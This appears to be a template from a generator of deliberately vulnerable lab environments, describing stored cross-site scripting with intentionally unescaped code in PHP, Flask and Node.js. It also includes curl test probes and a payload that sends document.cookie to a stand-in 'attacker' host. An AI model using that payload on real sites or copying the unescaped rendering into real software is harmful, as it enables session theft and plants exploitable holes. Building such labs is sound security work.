---
id: xss_stored
type: web_vulnerability
description: A stored cross-site scripting vulnerability where user input is persisted (in a database or file) and later rendered unsanitized in an HTML page, executing in any browser that views it.
required_vars: []
---
# Atom: Stored XSS

User-supplied input is saved to persistent storage (database, file) and later rendered directly into an HTML page without HTML encoding. Any JavaScript in the stored payload executes in the browser of every user who views the affected page.

In the context of GoE environments (single-operator, no real browser sessions), stored XSS is demonstrated by storing a payload and showing it reflected in the page — confirming the lack of sanitization. The attack chain typically demonstrates credential/cookie theft potential rather than live session hijacking.

### Logic Requirements:
1. User input is saved to a database or file via a POST endpoint.
2. The stored input is retrieved and rendered into an HTML page without `htmlspecialchars()`, `escape()`, or equivalent encoding.
3. HTML tags and JavaScript are preserved through the storage and retrieval cycle.
4. The page renders the payload in a context where script execution occurs (not inside an HTML attribute requiring a different breakout).

### Synthesis Guidance:
The natural cover story is a message board, comment section, guestbook, or feedback form — any feature where one user submits content that other users (or the admin) will view. For single-user demo environments, the same user who submits the payload also views it.

**PHP (Apache + MySQLi):**
```php
// Store: INSERT INTO comments (body) VALUES ('$_POST[comment]')  ← no sanitization
// Retrieve and render:
while ($row = mysqli_fetch_assoc($result)) {
    echo "<div class='comment'>" . $row['body'] . "</div>";  // ← no htmlspecialchars()
}
```
Payload: `<script>document.location='http://attacker/?c='+document.cookie</script>`
Demo payload (no external listener needed): `<script>alert(document.domain)</script>`

**Python / Flask (sqlite3):**
```python
# Store: conn.execute("INSERT INTO comments VALUES (?)", (request.form['comment'],))
# Retrieve:
for row in conn.execute("SELECT body FROM comments").fetchall():
    html += f"<div>{row[0]}</div>"  # ← Markup not escaped
return html
```
Note: Flask's `render_template` auto-escapes by default — use `render_template_string` with `Markup()` or `|safe` to create the vulnerability deliberately.

**Node.js / Express:**
```js
// Store: db.run("INSERT INTO comments VALUES (?)", [req.body.comment])
// Retrieve and render:
res.send(rows.map(r => `<div>${r.body}</div>`).join(''));  // ← no encoding
```

### Testing Guidance:
**Layer 1 — Internal state check:**
Submit a payload and verify it is stored and reflected unescaped:
```bash
# Submit a payload
curl -s -X POST http://localhost/app -d "comment=<script>alert(1)</script>"
# Retrieve the page and verify the tag is present unencoded
curl -s http://localhost/app | grep "<script>alert(1)</script>"
```
The response must contain the literal `<script>` tag — not its HTML-encoded form (`&lt;script&gt;`).

**Layer 2 — External attack probe (from attacker container):**
```bash
# Post the XSS payload
curl -s -X POST http://target/app -d "comment=<script>alert(document.domain)</script>"
# Verify the payload is stored and reflected unencoded in the page
curl -s http://target/app | grep -i "<script>"
```
A successful result shows the `<script>` tag in the HTML source, confirming stored XSS.
